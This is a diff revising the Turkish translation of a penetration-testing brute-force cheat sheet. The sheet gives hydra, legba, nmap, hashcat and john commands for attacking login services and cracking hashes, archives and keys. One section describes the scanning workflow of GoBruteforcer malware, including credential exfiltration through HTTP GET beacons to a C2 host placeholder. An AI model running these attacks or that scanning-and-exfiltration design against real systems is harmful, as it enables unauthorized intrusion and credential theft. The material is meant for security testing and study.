@@ -1,10 +1,8 @@
 # Brute Force - CheatSheet
 
-{{#include ../banners/hacktricks-training.md}}
-
 ## Varsayılan Kimlik Bilgileri
 
-Kullanılan technology için varsayılan kimlik bilgilerini **Google'da arayın** veya **şu bağlantıları deneyin**:
+Kullanılan teknoloji için varsayılan kimlik bilgilerini **google'da arayın** veya **şu bağlantıları deneyin**:
 
 - [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
 - [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
@@ -19,9 +17,9 @@ Kullanılan technology için varsayılan kimlik bilgilerini **Google'da arayın*
 - [**https://many-passwords.github.io/**](https://many-passwords.github.io)
 - [**https://theinfocentric.com/**](https://theinfocentric.com/)
 
-## **Kendi Dictionary'lerinizi Oluşturun**
+## **Kendi Sözlüklerinizi Oluşturun**
 
-Hedef hakkında mümkün olduğunca fazla bilgi toplayın ve özel bir dictionary oluşturun. Yardımcı olabilecek araçlar:
+Hedef hakkında mümkün olduğunca fazla bilgi bulun ve özel bir sözlük oluşturun. Yardımcı olabilecek araçlar:
 
 ### Crunch
 ```bash
@@ -47,13 +45,13 @@ cat /path/to/js-urls.txt | python3 getjswords.py
 ```
 ### [CUPP](https://github.com/Mebus/cupp)
 
-Kurban hakkındaki bilgilerinize (isimler, tarihler...) dayanarak parolalar oluşturun.
+Mağdur hakkındaki bilginize (isimler, tarihler...) dayanarak parolalar oluşturur.
 ```
 python3 cupp.py -h
 ```
 ### [Wister](https://github.com/cycurity/wister)
 
-Bir wordlist generator tool'u olan Wister, bir kelime kümesi sağlamanıza ve bu kelimelerden birden fazla varyasyon oluşturmanıza olanak tanır. Böylece belirli bir hedef için kullanabileceğiniz benzersiz ve ideal bir wordlist oluşturabilirsiniz.
+Bir kelime kümesi sağlamanıza olanak tanıyan bir wordlist oluşturma aracı; verilen kelimelerden birden fazla varyasyon oluşturmanızı ve belirli bir hedef için kullanabileceğiniz benzersiz ve ideal bir wordlist hazırlamanızı sağlar.
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
 
@@ -74,7 +72,7 @@ Finished in 0.920s.
 ```
 ### [pydictor](https://github.com/LandGrey/pydictor)
 
-### Wordlists
+### Wordlist'ler
 
 - [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
 - [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
@@ -87,13 +85,15 @@ Finished in 0.920s.
 - [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
 - [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)
 
-## Internet-wide bruteforcer workflow (Go tabanlı scanner'lar kullanılarak çıkarılan dersler)
+## Internet genelinde bruteforcer iş akışı (Go tabanlı tarayıcılardan alınan dersler)
 
-- **Mimariye göre ayarlanmış worker pool'ları** koruyun (örneğin `x86_64/arm64` için yaklaşık 95 goroutine, `i686` için yaklaşık 85, düşük seviye ARM için yaklaşık 50) ve **sabit concurrency** değerini korumak için bunları her saniye yeniden oluşturun; her worker çıkmadan önce tam olarak bir hedef IP işlesin.<sup>[[1]](#references)</sup>
-- **Rastgele public IPv4 adresleri** üretin; ancak honeypot yoğunluğu bariz olan veya yönlendirilemeyen aralıkları hariç tutun: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, cloud ağırlıklı `/8`'ler (`3/15/16/56`) ve DoD ile ilişkili `/8`'ler (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
-- **Cleartext login** denemelerinden (FTP/21, MySQL/3306, Postgres/5432, HTTP/80 üzerinden phpMyAdmin) önce kısa bir timeout (~2 sn) ile **service port'unu probe edin** ve uzak dictionary/C2 fetch işlemi başarısız olursa **küçük bir yerleşik credential listesine** geri dönün.
-- **Bulunan sonuçları**, `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` gibi küçük HTTP GET beacon'larıyla **exfiltrate edin** (`1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres` gibi service code'ları kullanarak); normal görünmek için ortak bir browser User-Agent'ı yeniden kullanın.
-- **phpMyAdmin spray**, `GET /index.php?lang=en` ile düzinelerce olası path'i (~80+) brute-force edebilir; PMA marker'larını (`pmahomme` theme/`phpmyadmin.css`/`navigation.php`) tespit edin ve auth yöntemini belirlemek için `codemirror.css?v=X.Y.Z` değerini parse edin: `<4.9` sürümleri `pma_username`/`pma_password` GET parametrelerini kabul eder; `>=4.9` sürümleri ise `server=1`, CSRF `token` ve aynı credential'lar ile POST gerektirir.
+Aşağıdaki davranışlar GoBruteforcer malware'inin tarama iş akışında gözlemlenmiştir; kesin değerler örneğe özeldir.<sup>[[1]](#references)</sup>
+
+- **Mimariye göre ayarlanmış worker pool'ları** koruyun (örneğin `x86_64/arm64` üzerinde 95 eşzamanlı worker, `i686` üzerinde 85, `armv5tel` üzerinde 35 ve diğer mimarilerde varsayılan olarak 50), etkin worker'ları her saniye kontrol edin ve hedefin altına düştüğünde yenilerini başlatın; her worker çıkmadan önce en fazla bir hedef IP işler.
+- **Rastgele public IPv4 adresleri** oluşturun, ancak belirgin şekilde yönlendirilemeyen ve operatör tarafından kaçınılan belirli aralıkları eleyin: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, cloud ağırlıklı `/8`'ler (`3/15/16/56`) ve DoD ile ilişkili `/8`'ler (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
+- **Cleartext login'leri** denemeden önce **service port'unu**, kısa bir timeout (~2 sn) ile probe edin (FTP/21, MySQL/3306, Postgres/5432, HTTP/80 üzerinden phpMyAdmin) ve C2 credential fetch başarısız olursa **küçük bir builtin credential listesine** geri dönün.
+- **Bulunan sonuçları**, `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` gibi küçük HTTP GET beacon'larıyla exfiltrate edin (service code'ları: `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`); tespit edilmemek için yaygın bir browser User-Agent'ını yeniden kullanın.
+- **phpMyAdmin spray**, `GET /index.php?lang=en` ile yaklaşık 80 olası path üzerinde brute-force yapabilir, PMA marker'larını (`pmahomme` theme/`phpmyadmin.css`/`navigation.php`) tespit edebilir ve auth akışını dallandırmak için `codemirror.css?v=X.Y.Z` değerini parse edebilir: `<4.9` sürümleri `pma_username`/`pma_password` GET parametrelerini kabul eder; `>=4.9` sürümleri `server=1`, CSRF `token` ve aynı credential'lar ile POST kullanır.
 
 ## Services
 
@@ -165,14 +165,14 @@ legba http.basic --username admin --password wordlists/passwords.txt --target ht
 legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 ```
-### HTTP - POST Form
+### HTTP - Post Form
 ```bash
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
 ```
-http**s** için "http-post-form" değerini "**https-post-form"** olarak değiştirmelisiniz
+http**s** için "http-post-form" değerini "**https-post-form" olarak değiştirmeniz gerekir
 
-### **HTTP - CMS --** (W)ordpress, (J)oomla veya (D)rupal ya da (M)oodle
+### **HTTP - CMS --** (W)ordpress, (J)oomla veya (D)rupal veya (M)oodle
 ```bash
 cmsmap -f W/J/D/M -u a -p a https://wordpress.com
 # Check also https://github.com/evilsocket/legba/wiki/HTTP
@@ -196,9 +196,6 @@ nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/va
 ```bash
 #hashcat
 hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt
-
-#https://github.com/Sjord/jwtcrack
-python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt
 
 #John
 john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256
@@ -292,11 +289,11 @@ nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
 
 legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
 ```
-**oracle_login**'i **patator** ile kullanabilmek için **kurmanız** gerekir:
+**patator** ile **oracle_login** kullanmak için şunları **kurmanız** gerekir:
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
-[Offline OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** ve **11.2.0.3**):
+[Çevrimdışı OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** and **11.2.0.3**):
 ```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
 ```
@@ -418,13 +415,13 @@ legba ssh --username admin --password wordlists/passwords.txt --target localhost
 # Try keys from a folder
 legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
 ```
-#### Weak SSH keys / Debian predictable PRNG
+#### Zayıf SSH anahtarları / Debian öngörülebilir PRNG
 
-Bazı sistemlerde kriptografik materyal oluşturmak için kullanılan random seed'de bilinen kusurlar bulunur. Bu durum, [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) gibi tools kullanılarak bruteforce yapılabilecek şekilde keyspace'in büyük ölçüde azalmasına neden olabilir. [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh) gibi önceden oluşturulmuş weak key kümeleri de mevcuttur.
+Bazı sistemlerde, kriptografik materyal oluşturmak için kullanılan random seed değerinde bilinen kusurlar bulunur. Bu durum, [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) gibi araçlarla brute-force uygulanabilecek şekilde keyspace'in önemli ölçüde daralmasına neden olabilir. [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh) gibi önceden oluşturulmuş zayıf key setleri de mevcuttur.
 
 ### STOMP (ActiveMQ, RabbitMQ, HornetQ and OpenMQ)
 
-STOMP text protocol, RabbitMQ, ActiveMQ, HornetQ ve OpenMQ gibi popüler message queueing services ile **sorunsuz iletişim ve etkileşime olanak sağlayan** yaygın olarak kullanılan bir messaging protocol'dür. Mesaj alışverişi yapmak ve çeşitli messaging operations gerçekleştirmek için standardized ve efficient bir yaklaşım sağlar.
+STOMP metin protokolü, RabbitMQ, ActiveMQ, HornetQ ve OpenMQ gibi popüler message queueing servisleriyle **sorunsuz iletişim ve etkileşime olanak tanıyan** yaygın olarak kullanılan bir messaging protokolüdür. Mesajları exchange etmek ve çeşitli messaging işlemlerini gerçekleştirmek için standartlaştırılmış ve verimli bir yaklaşım sunar.
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
 ```
@@ -466,8 +463,8 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 
 ### Online cracking veritabanları
 
-- [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
-- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1, ESS/SSP ile veya olmadan ve herhangi bir challenge değeriyle)
+- [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 ve SHA1)
+- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (ESS/SSP ile veya olmadan ve herhangi bir challenge değeriyle MSCHAPv2/PPTP-VPN/NetNTLMv1)
 - [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hash'ler, WPA2 capture'ları ve MSOffice, ZIP, PDF arşivleri...)
 - [https://crackstation.net/](https://crackstation.net) (Hash'ler)
 - [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
@@ -498,7 +495,7 @@ hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 ```
 #### Known plaintext zip attack
 
-Şifrelenmiş zip içinde bulunan bir dosyanın **plaintext**'ini (veya plaintext'in bir kısmını) bilmeniz gerekir. Şifrelenmiş bir zip içinde bulunan dosyaların **dosya adlarını ve boyutlarını** şu komutu çalıştırarak kontrol edebilirsiniz: **`7z l encrypted.zip`**\
+Şifrelenmiş zip dosyasının **içerdiği bir dosyanın** **plaintext**'ini (veya plaintext'in bir kısmını) bilmeniz gerekir. Şifrelenmiş bir zip dosyasının içindeki **dosya adlarını ve dosya boyutlarını** şu komutu çalıştırarak kontrol edebilirsiniz: **`7z l encrypted.zip`**\
 [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) aracını releases sayfasından indirin.
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
@@ -531,9 +528,9 @@ pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
 sudo apt-get install qpdf
 qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 ```
-### PDF Owner parolası
+### PDF Owner Password
 
-Bir PDF Owner parolasını kırmak için şuna bakın: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
+Bir PDF Owner password'ünü kırmak için şuna bakın: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
 ### JWT
 ```bash
@@ -567,9 +564,9 @@ john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
-### LUKS image
+### Lucks image
 
-#### Yöntem 1
+#### Method 1
 
 Kurulum: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
 ```bash
@@ -606,13 +603,13 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 
 ### DPAPI Master Key
 
-[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) kullanın ve ardından john'u çalıştırın
+[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) kullanın ve ardından john'u çalıştırın.
 
-### Open Office Pwd Protected Column
+### Open Office Parola Korumalı Sütun
 
-Parola tarafından korunan bir sütuna sahip bir xlsx dosyanız varsa korumayı kaldırabilirsiniz:
+Parola ile korunan bir sütuna sahip bir xlsx dosyanız varsa korumayı kaldırabilirsiniz:
 
-- **Google Drive'a yükleyin** ve parola otomatik olarak kaldırılır
+- **Google Drive'a yükleyin**, parola otomatik olarak kaldırılır
 - **Manuel olarak kaldırmak** için:
 ```bash
 unzip file.xlsx
@@ -638,7 +635,7 @@ crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
 hash-identifier
 > <HASH>
 ```
-### Wordlisteler
+### Kelime Listeleri
 
 - **Rockyou**
 - [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
@@ -647,24 +644,24 @@ hash-identifier
 
 ### **Wordlist Oluşturma Araçları**
 
-- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Yapılandırılabilir temel karakterler, klavye düzeni ve rotalarla gelişmiş keyboard-walk oluşturucu.
+- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Yapılandırılabilir temel karakterler, keymap ve rotalarla gelişmiş keyboard-walk oluşturucu.
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
 ```
 ### John mutation
 
-_**/etc/john/john.conf**_ dosyasını okuyun ve yapılandırın
+_**/etc/john/john.conf**_ dosyasını okuyun ve yapılandırın.
 ```bash
 john --wordlist=words.txt --rules --stdout > w_mutated.txt
 john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 ```
 ### Hashcat
 
-#### Hashcat attacks
+#### Hashcat saldırıları
 
 - **Wordlist attack** (`-a 0`) with rules
 
-**Hashcat**, zaten **rules içeren bir klasörle** birlikte gelir, ancak [**burada başka ilginç rules bulabilirsiniz**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
+**Hashcat** zaten **rules içeren bir klasörle** birlikte gelir, ancak [**burada başka ilginç rules bulabilirsiniz**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
 ```
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
@@ -748,8 +745,7 @@ Yaygın Uygulama Hash'lerini Kırma
 1400 | SHA-256                                          | Raw Hash
 1700 | SHA-512                                          | Raw Hash
 ```
-## Referanslar
+## References
 
-- [1] [GoBruteforcer'ın İçine Bakış: Yapay zeka tarafından oluşturulan sunucu varsayılanları, zayıf parolalar ve kripto odaklı kampanyalar](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
-
+- [1] [GoBruteforcer'ın İçinde: Yapay zeka tarafından oluşturulan sunucu varsayılanları, zayıf parolalar ve kripto odaklı kampanyalar](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
 {{#include ../banners/hacktricks-training.md}}
